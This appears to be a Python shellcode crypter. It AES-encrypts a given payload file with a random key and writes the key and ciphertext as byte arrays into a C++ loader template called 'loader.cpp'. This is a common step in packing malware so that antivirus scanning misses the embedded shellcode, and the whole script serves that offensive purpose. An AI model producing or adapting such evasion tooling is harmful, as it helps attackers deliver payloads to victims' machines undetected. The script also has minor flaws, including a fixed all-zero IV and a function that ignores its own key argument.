import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from os import urandom
import hashlib

def AESencrypt(plaintext, key):
    k = hashlib.sha256(KEY).digest()
    iv = 16 * b'\x00'
    plaintext = pad(plaintext, AES.block_size)
    cipher = AES.new(k, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(plaintext)
    return ciphertext,key


def printResult(key, ciphertext):
    print('char AESkey[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };')
    print('unsigned char AESshellcode[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };')

try:
    file = open(sys.argv[1], "rb")
    content = file.read()
except:
    print("Usage: .\AES_cryptor.py PAYLOAD_FILE")
    sys.exit()


KEY = urandom(16)
ciphertext, key = AESencrypt(content, KEY)

printResult(KEY,ciphertext)

template = open("loader.cpp", "rt")
data = template.read()
data = data.replace('unsigned char AESkey[] = { };', 'unsigned char AESkey[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };')
data = data.replace('unsigned char payload[] = { };', 'unsigned char payload[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };')

template.close()
template = open("new.loader.cpp", "w+")
template.write(data)
